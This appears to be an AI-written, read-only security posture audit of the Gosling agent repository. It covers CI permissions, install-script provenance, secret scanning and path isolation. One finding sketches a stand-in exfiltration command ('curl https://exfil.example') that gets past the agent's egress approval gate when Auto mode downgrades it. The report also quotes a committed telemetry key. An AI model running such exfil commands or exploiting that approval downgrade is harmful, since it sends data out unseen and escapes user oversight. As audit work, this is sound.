# Gosling — Combined Repo Posture / State Audit (2026-08-15)

**Date:** 2026-08-15  
**Target:** `/Users/eric/Work/vscode/forked/gosling`  
**Branch:** `main`  
**HEAD:** `073d19428509ea6eb317924b1856a1fe7e9002c8` (`refine XAI auth settings and OAuth handling`)  
**Authority:** `read_only` — source not modified. This file is the only write.  
**Variant:** posture Variant A plus triage companion; architecture-drift **limited** (ADRs + `docs/architecture*` + sampled `.architecture/`; no full invariant-engine run).  
**Lenses:** `audit-security-repo-posture`, `audit-security-repo-triage`, `audit-deadcode-cleanup`, `audit-dataflow-pipeline-graph`, `audit-architecture-drift` (limited), `audit-repo-state-reconciliation`, `audit-repo-path-consistency`.

The supplied prompt is treated as a draft. The intended mission is preserved: one evidence-backed posture/state report at this HEAD. Review is expanded to adjacent CI trust-chain, path-root, pipeline-default, and ledger-staleness seams implied by the assigned skills.

Historical `docs/cloud/audit-security-repo-*.md`, `audit-deadcode-cleanup.md`, and `audit-dataflow-pipeline-graph.md` were used as **seeds only**. Several prior Confirmed findings do not hold at `073d19428` and are recorded as repaired non-findings.

## Effort budget and stop conditions

| Lens | Budget used | Stop condition |
|---|---|---|
| Repo posture + triage | ~35 targeted workflow/config reads; secret-pattern sweep excluding `node_modules`/`target` | Trust-boundary core (secrets, permissions, triggers, actions, injection) complete; remaining workflows sampled |
| Dead code | Entry-point inventory + dropped-feature counter-search + `#[allow(dead_code)]` census | Dynamic-edge ceiling applied; no clippy/`cargo-udeps` run |
| Pipeline graph | Static extraction of `Agent::reply` → persist | Gates 7–11 harness not implemented (read-only; no test execution) |
| Architecture drift | ADRs 0002/0005/0008/0014, `docs/architecture.md`, sampled `.architecture/` | No formal engine eval; AID-013 N/A (no baseline) |
| State reconciliation | `docs/TODO.md`, both build-states, session logs, defect ledgers, prior cloud reports | Git platform PR API not queried |
| Path consistency | `GOSLING_PATH_ROOT`, hermit, Electron launchers, plugin path split | Relocation drill not run; no `scan_repo_paths.py` |

**Oracle integrity:** no fresh-process entrypoint was executed. Claims that tests passed come from dated session/build ledgers, not this run. Those claims are **not** used to close state-mutation findings.

**Draft-prompt expansion:** platform branch-protection is `not_observable`; Git history secret scan was not run (`max_depth: fast`).

---

## 1. Summary table

| Field | Value |
|---|---|
| Repository | `gosling` (local remote `cephalopod-ai/gosling`; committed identity `repo-makeover/gosling`) |
| Platform | GitHub |
| Audit mode | `audit_only` |
| Variant | baseline posture + triage + state/path/pipeline/deadcode; drift limited |
| Overall posture | **partial** |
| Overall triage risk | **medium** |
| Highest-risk path | `curl \| bash` install of `download_cli.sh` with no checksum/signature check, while release CI *does* generate Sigstore/SLSA attestations |
| Critical | 0 |
| High | 0 |
| Medium | 10 |
| Low | 7 |
| Info | 5 |
| Not observable | 5 |
| Not applicable | 2 |

### Finding index (ID + severity + path)

| ID | Severity | Confidence | Path |
|---|---|---|---|
| [RSP-GSL-001](#rsp-gsl-001-install-script-does-not-verify-release-provenance) | Medium | Confirmed | `download_cli.sh:216-231` |
| [RSP-GSL-002](#rsp-gsl-002-no-repository-secret-scanning-job) | Medium | Confirmed | `.github/workflows/` (search: no scanner) |
| [RSP-GSL-003](#rsp-gsl-003-cargo-deny-checks-advisories-only) | Medium | Confirmed | `deny.toml:1-18`, `.github/workflows/cargo-deny.yml:29` |
| [RSP-GSL-004](#rsp-gsl-004-dependabot-auto-merges-minorpatch-on-pull_request_target) | Medium | Confirmed | `.github/workflows/dependabot-auto-merge.yml:1-35` |
| [RSP-GSL-005](#rsp-gsl-005-posthog-project-api-key-committed-while-telemetry-is-hard-off) | Low | Confirmed | `crates/gosling/src/posthog.rs:16-29` |
| [RST-GSL-001](#rst-gsl-001-paused-test-finder-workflow-still-dispatchable-with-model-secret-and-write-token) | Medium | Confirmed | `.github/workflows/test-finder.yml:1-28` |
| [RST-GSL-002](#rst-gsl-002-authorized-commenter-can-build-untrusted-pr-head-with-oidc) | Medium | Confirmed | `.github/workflows/pr-comment-bundle-windows.yml:113-123` |
| [DEAD-GSL-001](#dead-gsl-001-extraction_planmd-describes-removed-modules-as-present) | Medium | Confirmed | `EXTRACTION_PLAN.md:1-40` |
| [DEAD-GSL-002](#dead-gsl-002-sessiontypescheduled-has-no-production-constructor) | Low | Likely | `crates/gosling/src/session/session_manager.rs:87-90` |
| [DEAD-GSL-003](#dead-gsl-003-posthog-emitters-are-runtime-dead-but-the-module-is-reachable) | Low | Confirmed (runtime-dead) / not unreferenced | `crates/gosling/src/posthog.rs:259-262` |
| [DEAD-GSL-004](#dead-gsl-004-test-finder-cron-is-commented-out-workflow-remains) | Low | Confirmed | `.github/workflows/test-finder.yml:4-7` |
| [PGR-GSL-001](#pgr-gsl-001-egress-requireapproval-is-auto-downgraded-in-auto-mode) | Medium | Confirmed | `crates/gosling/src/tool_inspection.rs:52-54,109-125`; `crates/gosling/src/security/egress_inspector.rs:389-399` |
| [PGR-GSL-002](#pgr-gsl-002-bedrocksagemaker-still-export-aws_-into-the-process-environment) | Medium | Confirmed | `crates/gosling/src/providers/aws_env.rs:9-45`; `bedrock.rs:87-99` |
| [ARC-GSL-001](#arc-gsl-001-version-surfaces-remain-010-against-a-100-release-intent) | Low | Confirmed | `Cargo.toml:11`; `docs/TODO.md:32-36` |
| [REC-GSL-001](#rec-gsl-001-local-remote-is-cephalopod-ai-committed-identity-is-repo-makeover) | Medium | Confirmed | `.git/config:8-9`; `Cargo.toml:14`; CI `github.repository == 'repo-makeover/gosling'` |
| [REC-GSL-002](#rec-gsl-002-workspace-build-state-is-stale-relative-to-shell-productization) | Low | Confirmed | `docs/build/build-state.md:3`; `docs/build/shell-productization/build-state.md:1-14` |
| [RPC-GSL-001](#rpc-gsl-001-gosling_path_root-plugin-settings-use-a-different-tree-than-pathsconfig_dir) | Medium | Confirmed | `crates/gosling/src/config/paths.rs:8-11`; `crates/gosling/src/plugins/discovery.rs:282-288` |
| [RPC-GSL-002](#rpc-gsl-002-plugins_dir-and-agents_dir-ignore-runtimepaths-scope) | Medium | Confirmed | `crates/gosling/src/config/paths.rs:40-68` |

---

## 2. Posture matrix

| Category | Status | Severity | Confidence |
|---|---|---|---|
| Secrets controlled and rotated | **partial** | Medium | Confirmed |
| Dependencies inventoried and updated | **partial** | Medium | Confirmed |
| Workflows least-privileged and trust-boundary aware | **partial** | Medium | Confirmed |
| Third-party automation pinned and governed | **pass** (minor residual) | Low | Confirmed |
| Branches protected and owned | **not_observable** / partial | — | — |
| Runners isolated and observable | **pass** | — | Confirmed (no `self-hosted`) |
| Artifacts signed and provenance-backed | **partial** | Medium | Confirmed |
| Alerts routed to owners with enforced remediation | **partial** | Low | Confirmed |

**Verdict rationale (`partial`):** no Critical/High exploit path confirmed at this HEAD; Secrets and Workflows are `partial` with Medium findings; three or more categories are `partial`. Prior Critical-if-reachable comment-build bypass is **repaired**.

### Triage priority matrix

| Order | Category | Status | Highest severity | Confidence |
|---:|---|---|---|---|
| 1 | Secrets | partial | Low (committed PostHog key, telemetry off) | Confirmed |
| 2 | Workflow permissions | partial | Medium | Confirmed |
| 3 | Dangerous triggers | partial | Medium | Confirmed |
| 4 | Third-party actions | pass | — | Confirmed SHA-pin majority |
| 5 | Script injection | pass / constrained | Low | Confirmed |
| 6 | Dependencies | partial | Medium | Confirmed |
| 7 | Branch/review governance | not_observable | — | — |
| 8 | Publishing path | pass / constrained | Medium residual (trusted commenter → PR head) | Confirmed |
| 9 | Runners | pass | — | GitHub-hosted only |
| 10 | Release integrity | partial | Medium | Confirmed |

---

## 3. Anchors and identity

```
.git/HEAD          ref: refs/heads/main
.git/refs/heads/main  073d19428509ea6eb317924b1856a1fe7e9002c8
.git/config remote.origin.url  https://github.com/cephalopod-ai/gosling.git
```

Not a linked worktree: `.git` is a directory, not a gitfile. `ignorecase = true` on this Darwin checkout.

Orientation (`docs/cloud/2026-08-15-orientation.md:5-7`) matches this HEAD.

---

## 4. Findings

### RSP-GSL-001: Install script does not verify release provenance

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Compliance-Posture / Repo-Security-Posture

Evidence:
- `download_cli.sh:14` advertises `curl -fsSL https://github.com/repo-makeover/gosling/releases/download/stable/download_cli.sh | bash`.
- `download_cli.sh:216-220` downloads the binary with `curl -sLf "$DOWNLOAD_URL" --output "$FILE"` and extracts it.
- Search `cosign|sha256sum|attest|provenance` in `download_cli.sh`: **no matches**.
- Contrast: `.github/workflows/release.yml:102-135` sets `id-token: write` + `attestations: write` and runs `actions/attest-build-provenance` on the same artifact classes.

Observed behavior:
- Release CI produces Sigstore/SLSA attestations. The documented install path never checks a digest, signature, or attestation.

Expected boundary:
- A `curl | bash` binary install for a code-executing agent must verify the artifact against CI-produced provenance, or the install docs must refuse to claim a signed/attested release.

Failure mechanism:
- The strongest supply-chain control (attest) is not connected to the user-facing control (install).

Break-it angle:
- Substitute a GitHub release asset or MITM a non-pinned `stable` tag; the installer accepts any 200 body named like `gosling-$ARCH-…`.

Impact:
- Install-time binary substitution. Blast radius: Cross-system. Side-effect class: file/process. Reversibility: compensatable (reinstall after rotation). Operator visibility: silent. Rerun safety: unsafe.

Adjacent failure modes:
- `REC-GSL-001` (script hardcodes `repo-makeover/gosling` even if this checkout publishes elsewhere).

Recommended mitigation:
- Remediation patterns: release-integrity gate.
- Minimal repair: fetch and verify a SHA-256 (or cosign) published next to the asset before extract.
- Local guardrail: fail closed if checksum file is missing.
- Behavior test: serve a wrong-hash asset and assert the script exits non-zero and leaves no installed binary.

Implementation assessment:
- Complexity: workflow_protocol. Cost: S. Cost drivers: scripts, docs, release workflow. Nominal agent: codex.

Validation:
- Fresh-process `download_cli.sh` against a mutated digest fails; against the attested digest succeeds.

Non-goals:
- Do not redesign the release matrix.

### RSP-GSL-002: No repository secret-scanning job

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Repo-Security-Posture

Evidence:
- Search `gitleaks|trufflehog|detect-secrets|secret.?scan|push.?protection` across workflows/docs: hits only in prior audit prose, not a scanner job.
- `.github/workflows/ci.yml:15-16` `permissions: contents: read`; jobs are fmt/build/test/clippy/schema/desktop lint — no secret scan.
- Org GitHub push-protection is **not_observable**.

Observed behavior:
- Introduction of a provider key depends on review and optional platform scanning that this tree does not declare.

Expected boundary:
- A 15+ provider agent with OAuth/API keys should have a documented scanner or an explicit documented reliance on org push-protection.

Failure mechanism:
- Control absent, not merely unenforced.

Impact:
- Credential persistence in git history if a key is committed. Blast radius: Repo / Cross-system. Side-effect class: none until a leak. Reversibility: irreversible in git history. Operator visibility: silent.

Recommended mitigation:
- Add a `gitleaks`/`trufflehog` job on `pull_request`+`push`, or document org push-protection in `SECURITY.md`.
- Behavior test: planted `AKIA`-shaped fixture fails CI.

Implementation assessment:
- Complexity: workflow_protocol. Cost: S. Nominal agent: codex.

Non-goals:
- Do not claim a live leaked secret; the working-tree secret sweep found only fixtures/examples and the hard-disabled PostHog key.

### RSP-GSL-003: cargo-deny checks advisories only

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Repo-Security-Posture

Evidence:
- `deny.toml:1-18` is an `[advisories]` block (yanked deny; unmaintained/unsound none; three RUSTSEC ignores).
- Search `^\[licenses\]|^\[bans\]|^\[sources\]` in `deny.toml`: **no matches**.
- `.github/workflows/cargo-deny.yml:29` `command: check advisories`.
- Lockfile and Dependabot **are** present (`Cargo.lock`; `.github/dependabot.yml:1-43` covers npm/cargo/docker/github-actions).

Observed behavior:
- Vulnerability/yanked crates are gated. License, banned crate, and source-registry policy are not.

Expected boundary:
- Deployable agent + desktop should at least deny unexpected git/path crates and encode a license allowlist if that is project policy.

Recommended mitigation:
- Add `[licenses]`/`[bans]`/`[sources]` incrementally; change the workflow to `check` (all configured sections).
- Behavior test: a path/git dependency outside the allowlist fails CI.

Implementation assessment:
- Complexity: governance_decision. Cost: M. Nominal agent: human-owner for policy, then codex.

### RSP-GSL-004: Dependabot auto-merges minor/patch on `pull_request_target`

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Repo-Security-Posture

Evidence:
- `.github/workflows/dependabot-auto-merge.yml:3-13` `on: pull_request_target` with `contents: write` + `pull-requests: write`, gated to `dependabot[bot]` **and** `github.repository == 'repo-makeover/gosling'`.
- `:21-35` approves and `gh pr merge --auto --merge` for semver-minor/patch.

Observed behavior:
- On the named upstream repo, unattended merge of Dependabot minor/patch is enabled. This checkout's origin is `cephalopod-ai/gosling`, so the job is a no-op here (`REC-GSL-001`).

Expected boundary:
- Auto-merge is acceptable only with a blocking advisory/license/ban gate. Today the only deny job is advisories.

Failure mechanism:
- Combined with RSP-GSL-003, a non-advisory malicious or license-toxic minor bump can merge without a human.

Recommended mitigation:
- Keep the actor/repo gate; require `cargo-deny` + lockfile review status checks before auto-merge, or drop auto-merge.

Implementation assessment:
- Complexity: governance_platform_task. Cost: S. Nominal agent: human-owner.

### RSP-GSL-005: PostHog project API key committed while telemetry is hard-off

Severity: Low  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Repo-Security-Posture

Evidence:
- `crates/gosling/src/posthog.rs:16` `const POSTHOG_API_KEY: &str = "phc_RyX5CaY01VtZJCQyhSR5KFh6qimUy81YwxsEpotAftT";` (value not re-echoed here beyond the already-public source token).
- `:22-29` `get_telemetry_choice() -> Some(false)` and `is_telemetry_enabled() -> false`.
- `:259-262` emitters return immediately when disabled.

Observed behavior:
- A product telemetry write key remains in source. Runtime send is hard-disabled.

Expected boundary:
- Either delete the dead capture surface (`DEAD-GSL-003`) or rotate and keep keys out of the tree.

Impact:
- Project-scoped PostHog write if someone re-enables the flag without rotating. Not a live exfil path today.

Recommended mitigation:
- Remove key + capture client with Workstream C of `EXTRACTION_PLAN.md`, or move to a platform secret if telemetry is restored.

Non-goals:
- Do not treat this as a live credential without testing (forbidden).

### RST-GSL-001: Paused test-finder workflow still dispatchable with model secret and write token

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Security (RST-CIPERM / RST-PUBLISH / DEAD-023)

Evidence:
- `.github/workflows/test-finder.yml:4-7` daily cron is commented `PAUSED`.
- `:7-17` `workflow_dispatch` remains; `permissions: contents: write` + `pull-requests: write`.
- `:22-28` container `ghcr.io/repo-makeover/gosling:sha-9f661a6@sha256:…` with `OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}`.

Observed behavior:
- An LLM-driven “find untested code and open a PR” job can still be started manually with a write token and a live model secret.

Expected boundary:
- A paused privileged automation should lose write permissions and secret access, or be deleted.

Recommended mitigation:
- Remove the workflow or set `permissions: {}` and drop the secret until the job is redesigned.

Implementation assessment:
- Complexity: local_guardrail. Cost: XS. Nominal agent: codex.

### RST-GSL-002: Authorized commenter can build untrusted PR head with OIDC

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Security (RST-TRIGGER)

Evidence:
- `.github/workflows/pr-comment-bundle-windows.yml:38` now gates `continue: ${{ steps.security_check.outputs.authorized }}` (historical hardcoded `'true'` is **gone**).
- `:61-67` `getCollaboratorPermissionLevel` allowlist `admin|maintain|write`.
- `:113-123` on `continue == 'true'`, reusable `bundle-desktop-windows.yml` runs with `id-token: write` and `ref: ${{ needs.trigger-on-command.outputs.head_sha }}`.

Observed behavior:
- Unauthorized commenters cannot start the build (repaired). A **write-access collaborator** commenting `.bundle-windows` on a fork/untrusted PR still builds that PR head in a job that can mint OIDC tokens.

Expected boundary:
- Privileged OIDC / signing identity must not attach to untrusted PR-head checkouts, even when a maintainer clicked the command. Prefer `signing: false` **and** no `id-token: write`, or build merge-base only.

Impact:
- Confused-deputy if a maintainer is socially engineered to comment on a malicious PR. Blast radius: Cross-system if OIDC is federated. Operator visibility: log-only.

Recommended mitigation:
- Drop `id-token: write` from comment-triggered bundle jobs (`signing: false` already). Keep SHA pin + collaborator gate.

Implementation assessment:
- Complexity: workflow_protocol. Cost: S. Nominal agent: codex.

### DEAD-GSL-001: `EXTRACTION_PLAN.md` describes removed modules as present

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Architecture / Dead-Code (**DEAD-017** stale doc; **not** dead runtime code)

Evidence:
- `EXTRACTION_PLAN.md:14-17` claims current state as of `c5fbbd7`, including `crates/gosling/src/providers/local_inference/`.
- Directory listing of `crates/gosling/src/providers/` has no `local_inference` (providers present: bedrock, xai, tagteam, …).
- `crates/gosling/Cargo.toml:10-67` features: `telemetry`, `tagteam-workflow`, `aws-providers`, … — no `local-inference`/`cuda`/`mlx`.
- Search `llama-cpp|hf-hub|mlx-rs` in current `Cargo.toml` files: no live dependency hits (only this plan).

Observed behavior:
- A top-level 25 KB plan still inventories deleted trees as if they exist. Workstream C (telemetry/update) remains partly accurate (`posthog.rs` still compiled).

Classification:
- **Confirmed stale documentation**, not confirmed unreachable code.
- Disposition: `remove_stale_doc_reference` (partial) / annotate A+B done, keep C.

Removal risk: `safe-to-propose` for A/B text. Do not delete C without a replacement plan.

### DEAD-GSL-002: `SessionType::Scheduled` has no production constructor

Severity: Low  
Confidence: Likely (`possible_orphan` / **keep-with-reason**)  
Evidence basis: source-evidenced  
Domain: Dead-Code (**DEAD-009** / **DEAD-020**)

Evidence:
- `crates/gosling/src/session/session_manager.rs:87-90` enum still has `Scheduled`.
- Production reads: `session_manager.rs:1036` skip rename; `list_sessions.rs:13-14` ACP list includes `Scheduled`.
- Production constructor search: only `session_manager.rs:6221` (test) plus list/filter sites.
- No `schedule` CLI/ACP create path found.

Classification:
- **Unreferenced as a create path** (static). **Not confirmed dead**: serde may still deserialize legacy `sessions.db` rows. Cap: Likely. Removal risk: `keep-with-reason` (on-disk compatibility) until a migration proves zero `scheduled` rows.

Disposition: `document_as_intentional` or `quarantine_legacy_path`.

### DEAD-GSL-003: PostHog emitters are runtime-dead but the module is reachable

Severity: Low  
Confidence: Confirmed (runtime-dead) / **not unreferenced**  
Evidence basis: source-evidenced  
Domain: Dead-Code (**DEAD-004** / **DEAD-009**)

Evidence:
- Reachable: `crates/gosling/src/lib.rs` `pub mod posthog`; callers in `session_manager.rs` and `agent.rs`.
- Runtime-dead: `posthog.rs:28-29` `is_telemetry_enabled() -> false`; `:259-262` early return.

Classification:
- Distinguish: **not an orphan module**. Confirmed **unreached send path** under current constants. Dynamic edge: someone flipping the function reactivates the committed key (`RSP-GSL-005`).
- Disposition: `delete_after_confirmed_unused` of capture/key, keep any local session-count side effects if still desired.

### DEAD-GSL-004: Test-finder cron is commented out; workflow remains

Severity: Low  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Dead-Code (**DEAD-023**) + Security

Evidence:
- `.github/workflows/test-finder.yml:4-7` schedule paused; `workflow_dispatch` live (`RST-GSL-001`).

Classification:
- Cron trigger is **confirmed unreached**. Workflow is **not** dead — manual dispatch still runs.
- Disposition: delete or fully disarm.

### DEAD-GSL-005: `#[allow(dead_code)]` on reachable `handle_fork_session` (non-finding / false positive)

Severity: Info  
Confidence: Confirmed reachable  
Domain: Dead-Code

Evidence:
- `crates/gosling/src/acp/server/fork_session.rs:4-5` `#[allow(dead_code)]` on `handle_fork_session`.
- Callers: `acp/server.rs:3515-3520` `on_fork_session` → handler; `acp/server/dispatch.rs:368` dispatches it.

Classification:
- **Not an orphan.** Stale lint suppression. Disposition: `keep_status_quo` or remove the allow.

### PGR-GSL-001: Egress `RequireApproval` is auto-downgraded in Auto mode

Severity: Medium (High if the session is `GoslingMode::Auto`)  
Confidence: Confirmed (code property); runtime default is SmartApprove  
Evidence basis: source-evidenced  
Domain: Failsafe / Security

Evidence:
- Default mode is **SmartApprove**, not Auto: `crates/gosling-providers/src/gosling_mode.rs:24-29` and test `:41-43`.
- Egress now **does** emit `RequireApproval` for outbound/unknown destinations: `egress_inspector.rs:389-399`.
- Trait default `auto_downgrades_require_approval() -> true` at `tool_inspection.rs:52-54`.
- `EgressInspector` does **not** override that method (unlike `SecurityInspector`, which returns `false` at `security_inspector.rs:61-65`).
- Auto-mode loop at `tool_inspection.rs:109-125` rewrites `RequireApproval` → `Allow` for downgrading inspectors.

Observed behavior:
- Default SmartApprove sessions keep egress as an approval gate. An Auto session logs egress and then allows it.

Expected boundary:
- Data-exfiltration findings should not be classified as “routine permission prompts.”

Failure mechanism:
- Default trait downgrade is inherited by egress.

Break-it angle:
- User selects Auto; model issues `curl https://exfil.example`; inspector requires approval; Auto downgrades; tool runs.

Recommended mitigation:
- Override `auto_downgrades_require_approval() -> false` on `EgressInspector` (mirror SecurityInspector).
- Behavior test: Auto mode + outbound curl still `needs_approval` or `denied`.

Implementation assessment:
- Complexity: local_guardrail. Cost: XS. Nominal agent: codex.

Non-goals:
- Do not change SmartApprove defaults in the same slice.

### PGR-GSL-002: Bedrock/SageMaker still export `AWS_*` into the process environment

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Security / Concurrency (open `docs/TODO.md:296-298`)

Evidence:
- `crates/gosling/src/providers/aws_env.rs:9-45` `std::env::set_var` for `AWS_*` keys; comments admit libc setenv races.
- `bedrock.rs:87-99` and `sagemaker_tgi.rs:51` call `export_aws_env` on every `from_env`.

Observed behavior:
- Provider-instance secrets can become process-global env for the AWS SDK default chain. The helper avoids overwriting pre-existing env and no-ops when unchanged, but two sessions with different AWS creds still share one process env.

Expected boundary:
- ADR-0002 (`docs/adr/0002-session-scoped-credentials.md:16-23`) requires session-scoped resolution without rewriting global credentials.

Failure mechanism:
- SDK default chain is process-global; scoped Config is bypassed by env export.

Recommended mitigation:
- As already written in `docs/TODO.md`: configure the AWS SDK per provider instance; delete env export after tests for concurrent different credentials.

Implementation assessment:
- Complexity: persistence_recovery / external_service_semantics. Cost: M. Nominal agent: multi-agent.

### ARC-GSL-001: Version surfaces remain `0.1.0` against a `1.0.0` release intent

Severity: Low  
Confidence: Confirmed  
Trace basis: declared (`docs/TODO.md`)  
Domain: Architecture (AID-001 partial implementation)

Evidence:
- `Cargo.toml:11` `version = "0.1.0"`.
- `docs/TODO.md:32-36` still open: change all version surfaces to `1.0.0` and execute `RELEASE_CHECKLIST.md`.

This is incomplete release intent, not a silent drift of a shipped 1.0.

### REC-GSL-001: Local remote is `cephalopod-ai`; committed identity is `repo-makeover`

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Workflow / Architecture

Evidence:
- `.git/config:8-9` `url = https://github.com/cephalopod-ai/gosling.git`.
- `Cargo.toml:14` `repository = "https://github.com/repo-makeover/gosling"`.
- Workflows gate jobs with `github.repository == 'repo-makeover/gosling'` (e.g. `dependabot-auto-merge.yml:13`, `cargo-deny.yml:21`, `scorecard.yml:25`).
- `download_cli.sh:57` `REPO="repo-makeover/gosling"`.
- `UPSTREAM.md` documents goose→gosling, **not** cephalopod-ai vs repo-makeover.

Observed behavior:
- This working tree’s `origin` is a different GitHub org than the one CI, packages, and the install script name. Jobs that require `repo-makeover/gosling` never run on `cephalopod-ai/gosling`.

Expected boundary:
- One declared publishing identity; fork remotes documented in `UPSTREAM.md`.

Impact:
- Operators can believe Scorecard/cargo-deny/auto-merge/release provenance apply to the remote they push, when those `if:` gates skip. Blast radius: Repo. Operator visibility: silent.

Recommended mitigation:
- Document the two remotes; or retarget `origin`; or parameterize repository checks.

Implementation assessment:
- Complexity: governance_decision. Cost: S. Nominal agent: human-owner.

### REC-GSL-002: Workspace build-state is stale relative to shell productization

Severity: Low  
Confidence: Confirmed  
Domain: Temporal / State-Transition

Evidence:
- `docs/build/build-state.md:3` “Last updated: 2026-07-19”; presents Workspaces PC-002 as the continuation point.
- `docs/build/shell-productization/build-state.md:1-14` updated 2026-08-15; current gate is **DS-7 operator decision**.
- `docs/TODO.md:10-28` matches the shell ledger, not the 2026-07-19 workspace ledger.

Classification:
- `docs/build/build-state.md` is a **completed campaign ledger**, not current repo status. A resume agent that reads it first will start the wrong work.

Disposition: banner the file “historical / Workspaces campaign complete.”

### RPC-GSL-001: `GOSLING_PATH_ROOT` plugin settings use a different tree than `Paths::config_dir`

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Input-Output-Path (RPC-010 / RPC-012)

Evidence:
- `crates/gosling/src/config/paths.rs:8-11` — under `GOSLING_PATH_ROOT`, config is `$ROOT/config`.
- `CONTRIBUTING.md:317-328` documents isolated `config/`, `data/`, and `state/` under that root.
- `crates/gosling/src/plugins/discovery.rs:282-288` — the same env var resolves plugin settings to `$ROOT/.config/gosling/settings.json`.
- Desktop shim agrees with `Paths`: `ui/desktop/src/bin/node-setup-common.sh:37-38` uses `${GOSLING_PATH_ROOT}/config`.

Observed behavior:
- A disposable root does **not** isolate plugin settings to the documented `config/` tree. Isolation tests that only inspect `$ROOT/config` can miss plugin enablement state.

Expected boundary:
- One root layout for every consumer of `GOSLING_PATH_ROOT`.

Recommended mitigation:
- Point `user_settings_path()` at `Paths::config_dir().join("settings.json")` (or the documented equivalent).
- Behavior test: CX-06-style isolation — plugin settings appear only under `$ROOT/config` and not under `$ROOT/.config`.

Implementation assessment:
- Complexity: local_guardrail. Cost: S. Nominal agent: codex.

Non-goals:
- Do not change default (non-override) XDG/home layout in the same slice.

### RPC-GSL-002: `plugins_dir` and `agents_dir` ignore `RuntimePaths` scope

Severity: Medium  
Confidence: Confirmed  
Evidence basis: source-evidenced  
Domain: Input-Output-Path / Architecture (ADR-0014 / shell isolation)

Evidence:
- `crates/gosling/src/config/paths.rs:40-54` — `config_dir`/`data_dir`/`state_dir` prefer `RUNTIME_PATHS`.
- `:58-68` — `plugins_dir`/`agents_dir`/`agents_home_dir` always call `get_dir`, never `RUNTIME_PATHS`.
- `RuntimePaths::for_namespace` (`:112-118`) namespaces only data/state, not plugins/agents.

Observed behavior:
- Shell/ACP instance scoping isolates config/data/state but not plugin/agent homes. Two scoped runtimes on one process can share plugin discovery.

Expected boundary:
- ADR-0014 / shell productization: product-local data roots; no cross-product residue.

Recommended mitigation:
- Either include plugin/agent homes in `RuntimePaths` or document them as intentionally process-global.

Implementation assessment:
- Complexity: workflow_protocol. Cost: M. Nominal agent: claude (docs+code) after owner decision.

---

## 5. Pipeline graph (static; Gates 7–11 not executed)

### Graph

```
user_message
  → Agent::reply (agent.rs:1738)
      recover_tool_operations
      hooks / slash-command short-circuit
  → reply_internal (agent.rs:2180)
      prepare_reply_context (tools, prompt, gosling_mode)
      load_project_instructions
      provider.fetch_model_info
      TURN LOOP
        compact / apply_context_manager
        stream_response_from_provider
        categorize_tool_requests
        Chat → skip tools
        else inspect_tools (agent.rs:2679-2687)
          Security → Egress → … → Permission
          inspector Err → RequireApproval (fail closed)
          Auto + auto_downgrade → Allow  [PGR-GSL-001]
        process_inspection_results_with_permission_inspector
          missing inspector → all needs_approval (fail closed, agent.rs:2695-2704)
        dispatch_tool_call / human confirmation
        drain results → conversation
        persist session_manager.add_message
  → Stop hook / AgentEvent stream (CLI, Desktop, server)
```

Mandatory paths (static classification only):

| Path | Intent | Result this run |
|---|---|---|
| A Canonical success | SmartApprove, inspector allow, tool runs, persist | **Not executed**. Structure present. |
| B Controlled branch | needs_approval → UI confirm | **Not executed**. Fail-closed fallback present. |
| C Rejection | Chat mode skip; inspector deny; cancel | **Not executed**. Chat skip at `agent.rs:2661-2677`. |

Randomization: **not run** (read-only; no harness approval). Seed: n/a.

Deferred branches: provider errors, compaction failure, frontend tools, MCP dispatch, subagent redirect (`agent.rs:2707+`), dry-run/shadow (no such product lanes found).

### Invariants (static disposition)

| # | Invariant | Disposition |
|---|---|---|
| 1 | Accepted job has a trace | Not Reviewed (runtime) |
| 2 | Rejected job fails closed | **Held** for missing permission inspector and inspector `Err` |
| 3 | Terminal state valid | Not Reviewed |
| 8 | Policy-denied paths do not persist forbidden side effects | **Held** for deny path; **fails in Auto+egress** (`PGR-GSL-001`) |
| 11 | Unknown capability fail closed | Not Reviewed |

---

## 6. Dead-code taxonomy coverage (DEAD-001..032)

| Code | Disposition |
|---|---|
| DEAD-001 unreferenced export | Non-finding at sampled roots; `handle_fork_session` is reachable |
| DEAD-002 orphaned module | Non-finding for dropped `local_inference`/`gateway` (absent) |
| DEAD-003 unreachable branch | Not Reviewed beyond Auto-downgrade (live) |
| DEAD-004 dead flag | `telemetry` feature empty; runtime hard-off (`DEAD-GSL-003`) |
| DEAD-005 clone | Not exhaustively clustered |
| DEAD-006 parallel impl | Tagteam provider + feature-gated workflow: **declared** dual (`ARC-005`) |
| DEAD-007 deprecated still called | `GOSLING_CONFIG_DIR` still read as fallback (`node-setup-common.sh:39-41`) |
| DEAD-008 deprecated no callers | Surface-not-complete |
| DEAD-009 shim past sunset | `SessionType::Scheduled` (`DEAD-GSL-002`) |
| DEAD-010 commented-out | `test-finder.yml` cron; not a code block |
| DEAD-011 orphaned asset | Not Reviewed |
| DEAD-012 unread config | Not Reviewed beyond path split |
| DEAD-013 unused migration | Not Reviewed |
| DEAD-014 test-only shipped | Not Confirmed |
| DEAD-015 unused dep | Not run (`cargo-machete` workflow exists; not executed) |
| DEAD-016 stale tool ref | Non-finding in sampled Justfile/CI |
| DEAD-017 stale doc | **Finding** `DEAD-GSL-001`; also `docs/build/build-state.md` |
| DEAD-018 transitive dead | N/A without confirmed orphans |
| DEAD-019 large module | Open TODO to split `agent.rs` / `session_manager.rs` / `main.ts` — **not dead** |
| DEAD-020 platform-gated | `peekaboo` macos-only: keep |
| DEAD-021 schema unused | `Scheduled` session type: keep-with-reason |
| DEAD-022 test rot | `live_tagteam_socket_smoke_test` ignored by design (`docs/TODO.md:130-131`) |
| DEAD-023 dead CI path | **Finding** `DEAD-GSL-004` / `RST-GSL-001` |
| DEAD-024 i18n | Not Reviewed |
| DEAD-025 dead style | Not Reviewed |
